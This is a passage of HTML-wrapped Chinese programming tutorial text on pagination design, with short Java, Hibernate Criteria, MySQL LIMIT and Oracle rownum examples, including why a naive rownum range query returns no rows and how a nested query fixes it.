data-slate-leaf="true" data-offset-key="1429:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7078313324" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1429:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3271252238" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2793965276" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1429:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3271252238" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_0051397886" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">getPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1429:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_2069516731" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1429:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1430"> <span data-slate-object="text" data-key="1431"><span data-slate-leaf="true" 
data-offset-key="1431:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1431:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8183750710" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1431:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9506131596" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1431:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6099498928" data-annotation-type="annotation"><span 
data-slate-string="true">getTotalPages</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1431:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_1678960910" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1431:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1432"> <span data-slate-object="text" data-key="1433"><span data-slate-leaf="true" 
data-offset-key="1433:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1433:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6619978545" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1433:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7905238334" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1433:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_9463395096" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span 
data-slate-string="true">getLastPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1433:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4471861997" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1433:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1434"> <span data-slate-object="text" data-key="1435"><span data-slate-leaf="true" 
data-offset-key="1435:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1435:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7952882934" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1435:2"><span data-slate-string="true"> Collection&lt;T&gt; 
getData() {}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1436"> <span data-slate-object="text" data-key="1437"><span 
data-slate-leaf="true" data-offset-key="1437:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 216px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-904aac1f " data-slate-type="paragraph" data-slate-object="block" 
data-key="1438"> <span data-slate-object="text" data-key="1439"><span data-slate-leaf="true" 
data-offset-key="1439:0" data-first-offset="true"><span data-slate-string="true">你看，这个分页对象和前面的那个例子不同，它将 
DAO（数据访问对象，在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1440" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="1441"><span data-slate-leaf="true" 
data-offset-key="1441:0" data-first-offset="true"><span data-slate-string="true">[第 12 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1442"><span data-slate-leaf="true" data-offset-key="1442:0" 
data-first-offset="true"><span data-slate-string="true"> 有介绍）的某次查询的结果，也就是某一页上的数据集合，给包装起来了。因此这个对象是由 
DAO 返回的，并且里面的数据仅仅是特定某一页的，这也是它没有提供用于翻页的方法的原因——具体要访问哪一页的数据，需要将页码和页面大小这样的信息传给 DAO 去处理。</span></span></span> 
</div> <h3 class="se-67102316" data-slate-type="heading" data-slate-object="block" data-key="1443"><span 
data-slate-object="text" data-key="1444"><span data-slate-leaf="true" data-offset-key="1444:0" 
data-first-offset="true"><span data-slate-string="true">其它方法</span></span></span></h3> <div 
class="se-d6b3bf43 " data-slate-type="paragraph" data-slate-object="block" data-key="1445"> 
<span data-slate-object="text" data-key="1446"><span data-slate-leaf="true" data-offset-key="1446:0" 
data-first-offset="true"><span data-slate-string="true">比如说，如果按照充血模型的方式来设计（关于充血模型是什么，以及代码实现的例子，你可以参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1447" class="se-e48fb8fa 
se-7e5be227"><span data-slate-object="text" data-key="1448"><span data-slate-leaf="true" data-offset-key="1448:0" 
data-first-offset="true"><span data-slate-string="true">[第 08 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1449"><span data-slate-leaf="true" data-offset-key="1449:0" 
data-first-offset="true"><span data-slate-string="true">），则可以</span></span></span><span data-slate-object="text" 
data-key="1450"><span data-slate-leaf="true" data-offset-key="1450:0" data-first-offset="true"><span 
class="se-9e87d030" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">把这个 
Page 对象和 DAO 的代码整合起来，放到同一个有状态的业务对象上面去，这样这个对象既携带了业务数据，又携带了分页信息。</span></span></span></span><span 
data-slate-object="text" data-key="1451"><span data-slate-leaf="true" data-offset-key="1451:0" 
data-first-offset="true"><span data-slate-string="true">当然，这个方法的区别其实只是贫血模型和充血模型的区别，从分页设计的角度上来看，和上面的第二种其实没有本质区别。</span></span></span> 
</div> <div class="se-5814665e " data-slate-type="paragraph" data-slate-object="block" data-key="1452"> 
<span data-slate-object="text" data-key="1453"><span data-slate-leaf="true" data-offset-key="1453:0" 
data-first-offset="true"><span data-slate-string="true">此外，一些“管得宽”的持久层 ORM 框架，往往也把分页的事情给包装了，给开发人员开放易于使用的分页接口。比方说 
Hibernate，你看这样一个例子：</span></span></span> </div> <div class="se-f801ad21 se-8d5c71fc" data-slate-type="pre" 
data-slate-object="block" data-key="1454" data-code-language="cpp"> <div class="se-a041aa56 
se-bea68a78"> <span></span> </div> <div class="se-ab9390f9"> <div class="se-c2b01b4c se-1a7380ac" 
data-code-line-number="1"></div> <div class="se-c2b01b4c se-1a7380ac" data-code-line-number="2"></div> 
<div class="se-c2b01b4c se-1a7380ac" data-code-line-number="3"></div> <div class="se-c2b01b4c 
se-1a7380ac" data-code-line-number="4"></div> <div class="se-c2b01b4c se-1a7380ac" data-code-line-number="5"></div> 
</div> <div class="se-38c5d79a ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1455"> <span data-slate-object="text" data-key="1456"><span 
data-slate-leaf="true" data-offset-key="1456:0" data-first-offset="true"><span data-slate-string="true">session 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1457"> <span data-slate-object="text" data-key="1458"><span 
data-slate-leaf="true" data-offset-key="1458:0" data-first-offset="true"><span data-slate-string="true">.createCriteria(Example.class)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1459"> <span data-slate-object="text" data-key="1460"><span data-slate-leaf="true" 
data-offset-key="1460:0" data-first-offset="true"><span data-slate-string="true">.setFirstResult(</span></span><span 
data-slate-leaf="true" data-offset-key="1460:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7048516071" data-annotation-type="annotation"><span data-slate-string="true">10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1460:2"><span data-slate-string="true">)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1461"> <span data-slate-object="text" data-key="1462"><span data-slate-leaf="true" 
data-offset-key="1462:0" data-first-offset="true"><span data-slate-string="true">.setMaxResults(</span></span><span 
data-slate-leaf="true" data-offset-key="1462:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1333175970" data-annotation-type="annotation"><span data-slate-string="true">5</span></span></span><span 
data-slate-leaf="true" data-offset-key="1462:2"><span data-slate-string="true">)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1463"> <span data-slate-object="text" data-key="1464"><span data-slate-leaf="true" 
data-offset-key="1464:0" data-first-offset="true"><span data-slate-string="true">.</span></span><span 
data-slate-leaf="true" data-offset-key="1464:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_4262300711" data-annotation-type="annotation"><span data-slate-string="true">list</span></span></span><span 
data-slate-leaf="true" data-offset-key="1464:2"><span data-slate-string="true">();</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-dcfaeb15 " data-slate-type="paragraph" data-slate-object="block" data-key="1465"> 
<span data-slate-object="text" data-key="1466"><span data-slate-leaf="true" data-offset-key="1466:0" 
data-first-offset="true"><span data-slate-string="true">这就是通过 Hibernate 的 Criteria Query API 
来实现的，代码也很易于理解。当然，如果想要取得总行数，那可以用 Projection：</span></span></span> </div> <div class="se-dafe0956 
se-7e0b479f" data-slate-type="pre" data-slate-object="block" data-key="1467" data-code-language="cpp"> 
<div class="se-789962b7 se-c6a72391"> <span></span> </div> <div class="se-f33b7799"> <div class="se-cced09fe 
se-479bbf21" data-code-line-number="1"></div> <div class="se-cced09fe se-479bbf21" data-code-line-number="2"></div> 
<div class="se-cced09fe se-479bbf21" data-code-line-number="3"></div> <div class="se-cced09fe 
se-479bbf21" data-code-line-number="4"></div> <div class="se-cced09fe se-479bbf21" data-code-line-number="5"></div> 
</div> <div class="se-72206612 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1468"> <span data-slate-object="text" data-key="1469"><span 
data-slate-leaf="true" data-offset-key="1469:0" data-first-offset="true"><span data-slate-string="true">session</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1470"> <span data-slate-object="text" data-key="1471"><span data-slate-leaf="true" 
data-offset-key="1471:0" data-first-offset="true"><span data-slate-string="true">.createCriteria(Example.class)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1472"> <span data-slate-object="text" data-key="1473"><span data-slate-leaf="true" 
data-offset-key="1473:0" data-first-offset="true"><span data-slate-string="true">.setProjection(Projections.rowCount())</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1474"> <span data-slate-object="text" data-key="1475"><span data-slate-leaf="true" 
data-offset-key="1475:0" data-first-offset="true"><span data-slate-string="true">.</span></span><span 
data-slate-leaf="true" data-offset-key="1475:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0272131860" data-annotation-type="annotation"><span data-slate-string="true">list</span></span></span><span 
data-slate-leaf="true" data-offset-key="1475:2"><span data-slate-string="true">()</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1476"> <span data-slate-object="text" data-key="1477"><span data-slate-leaf="true" 
data-offset-key="1477:0" data-first-offset="true"><span data-slate-string="true">.get(</span></span><span 
data-slate-leaf="true" data-offset-key="1477:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7571535938" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1477:2"><span data-slate-string="true">);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <h2 class="se-29f338e4" data-slate-type="heading" data-slate-object="block" data-key="1478"><span 
data-slate-object="text" data-key="1479"><span data-slate-leaf="true" data-offset-key="1479:0" 
data-first-offset="true"><span data-slate-string="true">SQL 实现</span></span></span></h2> <div 
class="se-7875f037 " data-slate-type="paragraph" data-slate-object="block" data-key="1480"> 
<span data-slate-object="text" data-key="1481"><span data-slate-leaf="true" data-offset-key="1481:0" 
data-first-offset="true"><span data-slate-string="true">如果使用关系数据库，那么落实到 SQL 上，以 MySQL 为例，大致是这样的：</span></span></span> 
</div> <div class="se-c95ba062 se-87e3972a" data-slate-type="pre" data-slate-object="block" 
data-key="1482" data-code-language="sql"> <div class="se-f15e0bf8 se-ceba18a3"> <span></span> 
</div> <div class="se-5e73107a"> <div class="se-21eadc57 se-04d18e84" data-code-line-number="1"></div> 
</div> <div class="se-977731a1 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1483"> <span data-slate-object="text" data-key="1484"><span 
data-slate-leaf="true" data-offset-key="1484:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5334940515" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1484:1"><span 
data-slate-string="true"> * </span></span><span data-slate-leaf="true" data-offset-key="1484:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9158610417" 
data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:3"><span data-slate-string="true"> TABLE_NAME 
</span></span><span data-slate-leaf="true" data-offset-key="1484:4"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4087266762" data-annotation-type="annotation"><span 
data-slate-string="true">limit</span></span></span><span data-slate-leaf="true" data-offset-key="1484:5"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1484:6"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_6915807412" 
data-annotation-type="annotation"><span data-slate-string="true">3</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:7"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1484:8"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6568235324" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:9"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-9acdee37 " data-slate-type="paragraph" data-slate-object="block" data-key="1485"> 
<span data-slate-object="text" data-key="1486"><span data-slate-leaf="true" data-offset-key="1486:0" 
data-first-offset="true"><span data-slate-string="true">limit 后面有两个参数，第一个表示从下标为 3 的行开始返回，第二个表示一共最多返回 
4 行数据。</span></span></span> </div> <div class="se-1b7c5397 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1487"> <span data-slate-object="text" data-key="1488"><span data-slate-leaf="true" 
data-offset-key="1488:0" data-first-offset="true"><span data-slate-string="true">但是，如果使用的是 
Oracle 数据库，很多朋友都知道可以使用行号 rownum，可是这里面有一个小坑——Oracle 给 rownum 赋值发生在当条子句的主干执行完毕后，比如说：</span></span></span> 
</div> <div class="se-a418d89f se-60b5c308" data-slate-type="pre" data-slate-object="block" 
data-key="1489" data-code-language="sql"> <div class="se-0c732125 se-1cdc380d"> <span></span> 
</div> <div class="se-cf6127dc"> <div class="se-79593424 se-2c6cbe1c" data-code-line-number="1"></div> 
</div> <div class="se-11852e8c ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1490"> <span data-slate-object="text" data-key="1491"><span 
data-slate-leaf="true" data-offset-key="1491:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_3967768581" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1491:1"><span 
data-slate-string="true"> * </span></span><span data-slate-leaf="true" data-offset-key="1491:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5072807923" 
data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:3"><span data-slate-string="true"> TABLE_NAME 
</span></span><span data-slate-leaf="true" data-offset-key="1491:4"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0409679511" data-annotation-type="annotation"><span 
data-slate-string="true">where</span></span></span><span data-slate-leaf="true" data-offset-key="1491:5"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1491:6"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7644686440" 
data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3089656330" data-annotation-type="annotation"><span data-slate-string="true">between</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:10"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6524441078" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6380864003" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2293175159" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:15"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 316px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5ac35003 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1492"> <span data-slate-object="text" data-key="1493"><span data-slate-leaf="true" 
data-offset-key="1493:0" data-first-offset="true"><span data-slate-string="true">如果表里面有 100 
行数据，那么你觉得上面那条 SQL 会返回什么？</span></span></span> </div> <div class="se-9083d066 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1494"> <span data-slate-object="text" data-key="1495"><span 
data-slate-leaf="true" data-offset-key="1495:0" data-first-offset="true"><span data-slate-string="true">返回 
2 行到第 4 行的数据吗？不对，它什么都不会返回。</span></span></span> </div> <div class="se-1c0ad431 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1496"> <span data-slate-object="text" data-key="1497"><span 
data-slate-leaf="true" data-offset-key="1497:0" data-first-offset="true"><span data-slate-string="true">这是为什么呢？因为对每一行数据，执行完毕以后才判断它的 
rownum，于是：</span></span></span> </div> <div class="se-0b22eef1" data-slate-type="list" data-slate-object="block" 
data-key="1498"> <div class="se-752cc80d se-0aaceb00" data-slate-type="list-line" data-slate-object="block" 
data-key="1499"> <span data-slate-object="text" data-key="1500"><span data-slate-leaf="true" 
data-offset-key="1500:0" data-first-offset="true"><span data-slate-string="true">第一行执行后的 rownum 
就是 1，而因为不符合“2 到 4”的条件，因此该行遍历后，就从结果集中抛弃了；</span></span></span> </div> <div class="se-e2fc76f7 
se-d63f9830" data-slate-type="list-line" data-slate-object="block" data-key="1501"> <span data-slate-object="text" 
data-key="1502"><span data-slate-leaf="true" data-offset-key="1502:0" data-first-offset="true"><span 
data-slate-string="true">于是执行第二行，由于前面那行被抛弃了，那这一行是新的一行，因此它的 rownum 还是 1，显然还是不符合条件，抛弃；</span></span></span> 
</div> <div class="se-2c3ed8f1 se-12ffad85" data-slate-type="list-line" data-slate-object="block" 
data-key="1503"> <span data-slate-object="text" data-key="1504"><span data-slate-leaf="true" 
data-offset-key="1504:0" data-first-offset="true"><span data-slate-string="true">每一行都这样操作，结果就是，所有行都被抛弃，因此什么数据都没有返回。</span></span></span> 
</div> </div> <div class="se-a0dc0f20 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1505"> <span data-slate-object="text" data-key="1506"><span data-slate-leaf="true" 
data-offset-key="1506:0" data-first-offset="true"><span data-slate-string="true">解决方法也不难，用一个嵌套就好，让里面那层返回从第 
1 条到第 4 条数据，并给 rownum 赋一个新的变量名 r，外面那层再过滤，取得 r 大于等于 3 的数据：</span></span></span> </div> <div 
class="se-fac4ce91 se-28d3b003" data-slate-type="pre" data-slate-object="block" data-key="1507" 
data-code-language="sql"> <div class="se-8a120a9d se-385ef156"> <span></span> </div> <div class="se-6e143da0"> 
<div class="se-ff32ce09 se-2f98b119" data-code-line-number="1"></div> </div> <div class="se-d44da55d 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1508"> <span data-slate-object="text" data-key="1509"><span data-slate-leaf="true" 
data-offset-key="1509:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0606525585" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:1"><span data-slate-string="true"> * </span></span><span 
data-slate-leaf="true" data-offset-key="1509:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6567250252" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:3"><span data-slate-string="true"> (</span></span><span 
data-slate-leaf="true" data-offset-key="1509:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7872842944" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:5"><span data-slate-string="true"> e.*, </span></span><span 
data-slate-leaf="true" data-offset-key="1509:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1232534677" data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:7"><span data-slate-string="true"> r </span></span><span 
data-slate-leaf="true" data-offset-key="1509:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9510946441" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:9"><span data-slate-string="true"> TABLE_NAME 
e </span></span><span data-slate-leaf="true" data-offset-key="1509:10"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1236978516" data-annotation-type="annotation"><span 
data-slate-string="true">where</span></span></span><span data-slate-leaf="true" data-offset-key="1509:11"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1509:12"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0203227898" 
data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:13"><span data-slate-string="true">&lt;=</span></span><span 
data-slate-leaf="true" data-offset-key="1509:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_0568469581" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:15"><span data-slate-string="true">) </span></span><span 
data-slate-leaf="true" data-offset-key="1509:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7838307895" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:17"><span data-slate-string="true"> r&gt;=</span></span><span 
data-slate-leaf="true" data-offset-key="1509:18"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2595452670" data-annotation-type="annotation"><span data-slate-string="true">3</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:19"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 208px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h2 class="se-108781df" data-slate-type="heading" data-slate-object="block" 
data-key="1510"><span data-slate-object="text" data-key="1511"><span data-slate-leaf="true" 
data-offset-key="1511:0" data-first-offset="true"><span data-slate-string="true">重复数据的问题</span></span></span></h2> 
<div class="se-0058a48c " data-slate-type="paragraph" data-slate-object="block" data-key="1512"> 
